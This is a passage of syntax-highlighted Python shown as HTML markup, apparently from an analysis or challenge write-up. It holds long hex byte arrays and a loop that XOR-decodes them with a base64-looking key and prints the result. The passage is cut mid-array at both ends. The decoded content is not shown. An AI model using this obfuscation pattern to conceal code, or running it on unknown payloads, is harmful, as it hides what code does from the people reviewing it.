class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x2C</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^=</span> <span class=mh>0x56</span>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;Vm0xd1NtUXlWa1pPVldoVFlUSlNjVlZyV21GVk1XeDBaRVYwYWxadVFsaFdiWFF3VmxkS1IxTnNXbFpXZWtFeFZsUkdTMk15VGtaYVJtUk9ZbXRLZVZacldtdFNNVnBYVm01R1UySkdXbFJVVnpWUFRURmtjbGRzWkU5U01IQXdWa2QwVjFaWFNrbFJiR2hWVm5wV2NsUlVSbFpsUmxwMFQxZG9UbUV5ZHpCWFYzUmhZekZhYzFacVdtbFNXRkpYV1ZkMGQyUnNVbGhsU0dSVVZqQndSMVpITVc5aFZscFlaSHBLVjJKVVFYaFdSRVp6VmpGS1dWcEdVbWxpVmtwdlZsZDRWazFXU2tkaVJtUllZbTFTV0ZWdGRHRk5WbXQzV2toT2FWSnNjRmRaTUdoM1ZqQXhWMk5JV2xkU1JVVjRWbXBHUjJOV1VuTlNiR1JUVWxWVk1RPT0=&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>2318</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>xor</span><span class=p>[</span><span class=n>i</span><span class=o>%</span><span class=mi>460</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>s</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x7D</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x2C</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x73</span><span 